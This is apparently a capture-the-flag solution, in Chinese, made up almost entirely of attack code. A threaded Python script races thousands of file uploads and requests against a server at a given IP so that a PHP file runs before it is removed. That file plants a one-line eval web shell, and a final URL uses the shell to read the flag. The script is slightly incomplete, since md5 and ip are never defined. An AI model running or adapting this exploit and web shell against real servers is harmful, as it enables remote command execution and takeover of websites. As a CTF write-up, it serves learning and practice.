解题脚本 `exp.py`

```python
import os
import threading

import requests


class upload_thread(threading.Thread):
    def __init__(self, url, param, filepath):
        threading.Thread.__init__(self)
        self.url = url
        self.param = param
        self.filepath = filepath

    def run(self):
        files = {}
        files[self.param] = open(self.filepath, "rb")
        requests.post(url=self.url, files=files)


class read_thread(threading.Thread):
    def __init__(self, url):
        threading.Thread.__init__(self)
        self.url = url

    def run(self):
        requests.get(url=self.url)


CONFIGS = {
    # 上传文件的参数名
    "param": "fileUpload",
    # 上传文件的URL
    "upload_url": "http://123.56.134.234:28111/",
    # 读取文件的URL
    "read_url": "http://123.56.134.234:28111/sandbox/"
    + md5(ip)
    + "/create_shell.php",
    # 被上传的文件的路径
    "filepath": "create_shell.php",
}

thread_pool = []

for i in range(3000):
    # 上传文件
    thread_upload = upload_thread(
        CONFIGS["upload_url"], CONFIGS["param"], CONFIGS["filepath"]
    )
    # 读取文件生成一句话木马
    thread_read = read_thread(CONFIGS["read_url"])
    # 将线程添加进线程池
    thread_pool.append(thread_upload)
    thread_pool.append(thread_read)

for thread in thread_pool:
    thread.start()

for thread in thread_pool:
    thread.join()

```

`create_shell.php`

```php
<?php file_put_contents("shell.php", '<?php eval($_GET["cmd"]);?>');?>
```

上传成功后 `http://localhost/shell.php?cmd=('cat /flag')` 读取flag